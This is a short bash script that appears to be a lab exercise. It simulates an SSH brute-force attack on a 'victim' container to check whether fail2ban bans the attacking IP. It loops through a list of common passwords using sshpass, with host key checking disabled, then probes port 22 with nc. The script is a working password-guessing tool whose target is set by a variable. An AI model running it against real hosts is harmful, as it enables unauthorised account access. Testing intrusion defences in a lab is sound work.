#!/bin/bash
# SSH brute-force SIMULATION against the lab "victim" container only.
TARGET="${TARGET:-victim}"
ATTEMPTS="${ATTEMPTS:-10}"
DELAY="${DELAY:-1}"
USERNAME="${USERNAME:-testuser}"
WORDS=(123456 password admin letmein qwerty root toor welcome dragon monkey 111111 abc123)

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o LogLevel=ERROR"

echo "=== Simulating brute force against $TARGET as '$USERNAME' ($ATTEMPTS attempts) ==="
for i in $(seq 1 "$ATTEMPTS"); do
  PW="${WORDS[$(( (i-1) % ${#WORDS[@]} ))]}"
  out=$(sshpass -p "$PW" ssh $SSH_OPTS "$USERNAME@$TARGET" true 2>&1)
  rc=$?
  case "$out" in
    *"Permission denied"*)              status="wrong password (auth failed, logged by sshd)";;
    *"refused"*|*"timed out"*|*"closed"*|*"reset"*) status="BLOCKED -> connection refused/dropped (banned by fail2ban!)";;
    *)                                  status="rc=$rc ${out}";;
  esac
  printf "[%02d] password=%-10s -> %s\n" "$i" "$PW" "$status"
  sleep "$DELAY"
done

echo
echo "=== Checking if port 22 is still reachable ==="
if nc -z -w 3 "$TARGET" 22; then
  echo "Port 22 OPEN  -> not banned (yet)"
else
  echo "Port 22 BLOCKED -> this IP has been banned by fail2ban"
fi
